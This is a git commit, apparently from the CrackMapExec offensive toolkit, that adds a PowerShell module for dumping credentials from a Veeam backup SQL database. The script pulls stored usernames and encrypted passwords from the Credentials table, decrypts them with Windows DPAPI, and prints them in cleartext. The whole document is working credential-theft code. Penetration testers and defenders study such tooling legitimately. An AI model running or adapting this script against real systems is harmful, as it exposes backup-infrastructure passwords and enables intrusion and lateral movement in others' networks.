d6ec502fc41d022f6cc8a19dc2e8f09dcb7854c1
Alexander Neff <alex99.neff@gmx.de>
2023-01-11 02:03:37 +0100

    Added module to dump credentials from veeam sql db

---
+++ cme/data/veeam_dump_module/veeam-creds_dump.ps1
@@ -0,0 +1,40 @@
+$SqlDatabaseName = "REPLACE_ME_SqlDatabase"
+$SqlInstanceName = "REPLACE_ME_SqlInstance"
+$SqlServerName = "REPLACE_ME_SqlServer"
+
+#Forming the connection string
+$SQL = "SELECT [user_name] AS 'User name',[password] AS 'Password' FROM [$SqlDatabaseName].[dbo].[Credentials] WHERE password <> ''" #Filter empty passwords
+$auth = "Integrated Security=SSPI;" #Local user
+$connectionString = "Provider=sqloledb; Data Source=$SqlServerName\$SqlInstanceName; Initial Catalog=$SqlDatabaseName; $auth;"
+$connection = New-Object System.Data.OleDb.OleDbConnection $connectionString
+$command = New-Object System.Data.OleDb.OleDbCommand $SQL, $connection
+
+#Fetching encrypted credentials from the database
+try {
+	$connection.Open()
+	$adapter = New-Object System.Data.OleDb.OleDbDataAdapter $command
+	$dataset = New-Object System.Data.DataSet
+	[void] $adapter.Fill($dataSet)
+	$connection.Close()
+}
+catch {
+	Write-Host "Can't connect to DB, exit."
+	exit -1
+}
+
+$rows=($dataset.Tables | Select-Object -Expand Rows)
+if ($rows.count -eq 0) {
+	Write-Host"No passwords found!"
+	exit
+}
+
+Add-Type -assembly System.Security
+#Decrypting passwords using DPAPI
+$rows | ForEach-Object -Process {
+	$EnryptedPWD = [Convert]::FromBase64String($_.password)
+	$ClearPWD = [System.Security.Cryptography.ProtectedData]::Unprotect( $EnryptedPWD, $null, [System.Security.Cryptography.DataProtectionScope]::LocalMachine )
+	$enc = [system.text.encoding]::Default
+	$_.password = $enc.GetString($ClearPWD)
+}
+
+Write-Output $rows | Format-Table -HideTableHeaders | Out-String
